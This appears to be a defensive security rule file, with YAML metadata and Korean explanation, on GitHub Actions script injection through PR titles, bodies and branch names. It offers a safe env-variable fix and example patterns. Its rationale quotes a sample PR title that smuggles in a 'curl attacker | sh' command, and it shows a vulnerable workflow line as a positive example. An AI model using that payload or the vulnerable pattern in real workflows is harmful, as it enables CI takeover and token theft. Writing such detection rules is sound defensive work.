---
id: GOV-CI-SCRIPT-INJECTION-001
title_ko: CI 셸 스크립트에 PR 제목·본문·브랜치명 같은 사용자 제어 값이 그대로 삽입됩니다
title_en: Workflow run step interpolates attacker-controlled context (PR title/body/branch) directly into a shell
status: approved
source_layer: baseline
sources:
  - publisher: GitHub
    document: Security hardening for GitHub Actions — Understanding the risk of script injections
    url: https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
cwe: [CWE-78, CWE-94]
severity: critical
decision_default: block
domains: [supply-chain]
languages: []
scenarios: [web-app, data-pipeline, agent, llm-integration, package-install]
related_baseline: [KISA-PY-INPUT-05, KISA-JS-INPUT-05]
verified_at: 2026-10-24
review_due: 2027-04-24
detection:
  patterns: []
  confidence: confirmed
  category: supply-chain
  why_it_matters: >-
    `run:` 블록 안의 `${{ github.event.pull_request.title }}` 같은 표현은 **셸 스크립트가 만들어지기 전에**
    문자열로 치환됩니다. PR 제목에 `"; curl attacker | sh; echo "` 를 쓰면 그대로 명령이 됩니다. 제목·본문·
    브랜치명·커밋 메시지·코멘트·리뷰 본문은 전부 외부인이 정하는 값입니다. 2026 prt-scan 캠페인이 이 경로를
    자동으로 훑었습니다. `env:` 로 받아 `"$VAR"` 로 쓰면 값이 **데이터**로 머물러 안전합니다.
  public_sector_impact:
    - PR 제목 한 줄로 CI 러너에서 임의 명령 실행 — 토큰 유출·릴리스 변조
  safe_fix: |
    ```yaml
    - run: echo "$PR_TITLE"
      env:
        PR_TITLE: ${{ github.event.pull_request.title }}
    ```
    위처럼 `env:` 에 담고 스크립트에서는 **따옴표로 감싼 변수**로만 쓰세요. `inputs.*`(수동 실행 입력)도 같은 방식으로.
  references:
    - GitHub Docs — Understanding the risk of script injections
    - CWE-78 OS Command Injection
  can_auto_fix: false
examples:
  positive:
    - "      - run: echo \"PR: ${{ github.event.pull_request.title }}\""
  negative:
    - "      - run: echo \"PR: $PR_TITLE\"\n        env:\n          PR_TITLE: ${{ github.event.pull_request.title }}"
---

## 오해하지 마세요

`${{ github.sha }}`·`${{ github.repository }}` 처럼 외부인이 정할 수 없는 값은 잡지 않는다. `env:` 블록 안의 표현도 잡지 않는다.
